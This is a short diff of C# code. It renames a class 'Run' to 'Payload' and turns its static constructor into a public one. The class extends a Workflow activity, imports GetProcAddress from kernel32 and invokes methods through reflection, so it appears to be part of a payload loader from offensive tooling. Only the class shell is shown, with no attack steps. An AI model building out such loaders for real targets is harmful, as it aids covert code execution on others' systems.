@@ -5,7 +5,7 @@ using System.Security.Cryptography;
 using System.Text;
 using System.Workflow.Activities;
 
-public partial class Run : SequentialWorkflowActivity
+public class Payload : SequentialWorkflowActivity
 {
     [DllImport("kernel32.dll")]
     static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
@@ -144,7 +144,7 @@ public partial class Run : SequentialWorkflowActivity
             method.Invoke(instance, null);
     }
 
-    static Run()
+    public Payload()
     {
         try
         {
